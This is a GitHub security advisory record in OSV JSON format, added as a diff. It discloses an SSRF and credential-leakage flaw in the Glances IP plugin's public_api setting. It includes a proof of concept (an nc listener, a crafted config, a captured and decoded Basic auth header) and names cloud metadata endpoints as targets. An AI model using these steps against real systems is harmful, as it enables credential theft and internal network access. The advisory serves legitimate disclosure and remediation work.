@@ -1,0 +1,192 @@
+{
+  "id": "GHSA-g5pq-48mj-jvw8",
+  "modified": "2026-04-21T15:41:15.182698Z",
+  "published": "2026-04-21T15:17:52Z",
+  "aliases": [
+    "CVE-2026-35587"
+  ],
+  "summary": "Glances has SSRF in IP Plugin via public_api leading to credential leakage",
+  "details": "### Summary\nA Server-Side Request Forgery (SSRF) vulnerability exists in the Glances IP plugin due to improper validation of the public_api configuration parameter. The value of public_api is used directly in outbound HTTP requests without any scheme restriction or hostname/IP validation.\n\nAn attacker who can modify the Glances configuration can force the application to send requests to arbitrary internal or external endpoints. Additionally, when public_username and public_password are set, Glances automatically includes these credentials in the Authorization: Basic header, resulting in credential leakage to attacker-controlled servers.\n\nThis vulnerability can be exploited to:\n\nAccess internal network services (e.g., 127.0.0.1, 192.168.x.x)\nRetrieve sensitive data from cloud metadata endpoints (e.g., 169.254.169.254)\nExfiltrate credentials via outbound HTTP requests\n\nThe issue arises because public_api is passed directly to the HTTP client (urlopen_auth) without validation, allowing unrestricted outbound connections and unintended disclosure of sensitive information.\n\n### Details\nThe vulnerability exists in the Glances IP plugin where the public_api configuration value is used to fetch public IP information. This value is read directly from the configuration file and passed to the HTTP client without any validation.\n\n**Root Cause**\nIn glances/plugins/ip/__init__.py, the public_api parameter is retrieved from configuration and later used to initialize a background thread responsible for making HTTP requests:\n\n```\nself.public_api = self.get_conf_value(\"public_api\", default=[None])[0]\n\nself.public_ip_thread = ThreadPublicIpAddress(\n    url=self.public_api,\n    username=self.public_username,\n    password=self.public_password,\n    refresh_interval=self.public_address_refresh_interval,\n)\n```\n\nThere is no validation performed on:\n- URL scheme (e.g., http, https, file)\n- Hostname or resolved IP address\n- Internal or restricted IP ranges\n- Unsafe HTTP Request Handling\n\nThe request is executed via urlopen_auth() in glances/globals.py:\n\n```\ndef urlopen_auth(url, username, password, timeout=3):\n    return urlopen(\n        Request(\n            url,\n            headers={\n                'Authorization': 'Basic ' +\n                base64.b64encode(f'{username}:{password}'.encode()).decode()\n            },\n        ),\n        timeout=timeout,\n    )\n```\n\nThis function:\n- Accepts any URL passed to it\n- Automatically attaches a Basic Authorization header\n- Does not enforce any restrictions on destination\n\n### PoC\nSSRF via public_api (Glances IP Plugin)\nPrerequisites\nGlances installed\nTwo terminals\n**Step 1**  Start listener (Terminal 1)\n`\nnc -lvnp 9999\n`\n\n**Step 2**  Create malicious config (Terminal 2)\n`\nmkdir -p ~/.config/glances\n`\n\n`\ncat \u003e ~/.config/glances/glances.conf \u003c\u003c 'EOF'\n[ip]\npublic_disabled=False\npublic_api=http://127.0.0.1:9999/ssrf-poc\npublic_username=apiuser\npublic_password=S3cr3tP@ss\nEOF\n`\n\n**Step 3**  Start Glances\nglances --webserver\n**Step 4** Observe SSRF request (Terminal 1)\n`\nGET /ssrf-poc HTTP/1.1\nHost: 127.0.0.1:9999\nUser-Agent: Python-urllib/3.x\n`\n\n`\nAuthorization: Basic YXBpdXNlcjpTM2NyM3RQQHNz\n`\n**Step 5** Decode leaked credentials\n`\necho \"YXBpdXNlcjpTM2NyM3RQQHNz\" | base64 -d\n`\n\n**Output:**\n`\napiuser:S3cr3tP@ss\n`\n**Step 6** Confirm data via API\n`\ncurl -s http://127.0.0.1:61208/api/4/ip\n`\n```\n{\n  \"address\": \"**.***.***.***\",\n  \"mask\": \"255.255.255.0\",\n  \"mask_cidr\": 24\n}\n```\n\n### Impact\nThis vulnerability allows an attacker to control outbound HTTP requests made by the Glances IP plugin via the public_api configuration parameter.\n\n**Server-Side Request Forgery (SSRF):**\nThe application can be forced to send requests to arbitrary endpoints, including internal services and localhost.\n**Credential Leakage:**\nWhen public_username and public_password are configured, they are automatically sent in the Authorization: Basic header to any target defined in public_api, exposing credentials to attacker-controlled servers.\n**Internal Network Access:**\nThe vulnerability enables access to internal resources such as:\n127.0.0.1 (localhost services)\nPrivate network ranges (192.168.x.x, 10.x.x.x, 172.16.x.x)\n**Cloud Metadata Exposure:**\nThe application can be directed to query cloud metadata endpoints such as:\nhttp://169.254.169.254/\npotentially exposing sensitive credentials (e.g., IAM tokens in cloud environments)\n**Data Injection / Manipulation:**\nResponses from attacker-controlled servers are accepted and stored by Glances, then exposed via /api/4/ip, allowing injection of arbitrary data into the application.\n\n\n## NOTE\nVulnerability Location\n\nThe issue originates from how the public_api configuration value is handled and used without validation.\n\n**1. Source of user-controlled input**\n\nFile: glances/plugins/ip/__init__.py\n(around lines ~64–82)\n`\nself.public_api = self.get_conf_value(\"public_api\", default=[None])[0]\nself.public_username = self.get_conf_value(\"public_username\", default=[None])[0]\nself.public_password = self.get_conf_value(\"public_password\", default=[None])[0]\npublic_api is fully user-controlled via configuration\n`\nNo validation is applied at this stage\n\n**2. Missing validation before usage**\n`\nself.public_disabled = (\n    self.get_conf_value('public_disabled', default='False')[0].lower() != 'false'\n    or self.public_api is None\n    or self.public_field is None\n)\n`\nOnly checks if the value is None\nNo validation of:\n- URL scheme\n- Hostname\n- IP address range\n\n**3. Vulnerable sink (critical point)**\n`\nself.public_ip_thread = ThreadPublicIpAddress(\n    url=self.public_api,            # ← user-controlled input\n    username=self.public_username,\n    password=self.public_password,\n    refresh_interval=self.public_address_refresh_interval,\n)\n`\nThe user-controlled public_api is passed directly into a network request\nThis is the SSRF entry point\n\n**4. Unsafe HTTP execution**\n\nFile: glances/globals.py\n(around lines ~360+)\n`\ndef urlopen_auth(url, username, password, timeout=3):\n    return urlopen(\n        Request(\n            url,   # ← no validation at all\n            headers={\n                'Authorization': 'Basic ' +\n                base64.b64encode(f'{username}:{password}'.encode()).decode()\n            },\n        ),\n        timeout=timeout,\n    )\n`\n\n- Accepts any URL\n- Sends request blindly\n- Automatically attaches credentials to any destination\n- Root Cause\n\nA user-controlled configuration value (public_api) is passed directly into an HTTP request without validation of scheme or destination, resulting in SSRF and credential leakage.\n\n**Recommendation**\nThe fix must be applied before the URL is used, specifically in the IP plugin (__init__.py).\n\n**1. Enforce scheme restrictions**\nAllow only:\nhttp\nhttps\nReject:\nfile://\ngopher://\nftp://\nany non-HTTP protocol\n\nThis prevents protocol abuse and local file access\n\n**2. Validate destination host**\nResolve the hostname to an IP address\nCheck the resolved IP against restricted ranges\n\n**Block if the IP is:**\n\nLoopback → 127.0.0.0/8\nPrivate → 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16\nLink-local → 169.254.0.0/16 (cloud metadata services)\n\n**This prevents:**\n\nInternal network probing\nAWS/GCP/Azure metadata access\nlocalhost abuse\n\n**3. Enforce validation before thread creation**\n\nThe validation must occur before initializing:\n\nThreadPublicIpAddress(...)\nIf validation fails:\nDisable the plugin\nDo not send any request\n\n**4. Trust boundary clarification**\nurlopen_auth() is a low-level utility\nIt should not be responsible for validation\n\nThe caller (IP plugin) must ensure:\n\nOnly safe, external URLs are passed\n\n**Why This Fix Works**\nScheme validation blocks protocol-based attacks\nIP validation blocks internal and cloud targets\nCombined, they eliminate the SSRF attack surface while preserving legitimate use cases (public IP APIs)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "glances",
+        "purl": "pkg:pypi/glances"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.5.4"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.3.1",
+        "1.3.2",
+        "1.3.3",
+        "1.3.4",
+        "1.3.5",
+        "1.3.6",
+        "1.3.7",
+        "1.4",
+        "1.4.1",
+        "1.4.1.1",
+        "1.4.2",
+        "1.4.2.1",
+        "1.5",
+        "1.5.1",
+        "1.5.2",
+        "1.6",
+        "1.6.1",
+        "1.7",
+        "1.7.1",
+        "1.7.2",
+        "1.7.3",
+        "1.7.4",
+        "1.7.5",
+        "1.7.6",
+        "1.7.7",
+        "2.0",
+        "2.0.1",
+        "2.1",
+        "2.1.1",
+        "2.1.2",
+        "2.10",
+        "2.11",
+        "2.11.1",
+        "2.2",
+        "2.2.1",
+        "2.3",
+        "2.4",
+        "2.4.1",
+        "2.4.2",
+        "2.5",
+        "2.5.1",
+        "2.6",
+        "2.6.1",
+        "2.6.2",
+        "2.7",
+        "2.7.1",
+        "2.8",
+        "2.8.1",
+        "2.8.2",
+        "2.8.3",
+        "2.8.4",
+        "2.8.5",
+        "2.8.6",
+        "2.8.7",
+        "2.8.8",
+        "2.9.0",
+        "2.9.1",
+        "3.0",
+        "3.0.1",
+        "3.0.2",
+        "3.1.0",
+        "3.1.1",
+        "3.1.2",
+        "3.1.3",
+        "3.1.4",
+        "3.1.4.1",
+        "3.1.5",
+        "3.1.6",
+        "3.1.6.1",
+        "3.1.6.2",
+        "3.1.7",
+        "3.2.0",
+        "3.2.1",
+        "3.2.2",
+        "3.2.3",
+        "3.2.3.1",
+        "3.2.4",
+        "3.2.4.1",
+        "3.2.4.2",
+        "3.2.5",
+        "3.2.6.1",
+        "3.2.6.2",
+        "3.2.6.3",
+        "3.2.6.4",
+        "3.2.7",
+        "3.3.0",
+        "3.3.0.1",
+        "3.3.0.2",
+        "3.3.0.3",
+        "3.3.0.4",
+        "3.3.1",
+        "3.3.1.1",
+        "3.4.0",
+        "3.4.0.1",
+        "3.4.0.2",
+        "3.4.0.3",
+        "3.4.0.4",
+        "3.4.0.5",
+        "4.0.1",
+        "4.0.2",
+        "4.0.3",
+        "4.0.4",
+        "4.0.5",
+        "4.0.6",
+        "4.0.7",
+        "4.0.8",
+        "4.1.0",
+        "4.1.1",
+        "4.1.2",
+        "4.2.0",
+        "4.2.1",
+        "4.3.0",
+        "4.3.0.1",
+        "4.3.0.3",
+        "4.3.0.4",
+        "4.3.0.5",
+        "4.3.0.6",
+        "4.3.0.7",
+        "4.3.0.8",
+        "4.3.1",
+        "4.3.2",
+        "4.3.3",
+        "4.4.0",
+        "4.4.1",
+        "4.5.0",
+        "4.5.0.1",
+        "4.5.0.2",
+        "4.5.0.3",
+        "4.5.0.4",
+        "4.5.0.5",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-g5pq-48mj-jvw8/GHSA-g5pq-48mj-jvw8.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/nicolargo/glances/security/advisories/GHSA-g5pq-48mj-jvw8"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-35587"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nicolargo/glances/commit/d6808be66728956477cc4b544bab1acd71ac65fb"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/nicolargo/glances"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nicolargo/glances/releases/tag/v4.5.4"
+    }
+  ]
+}
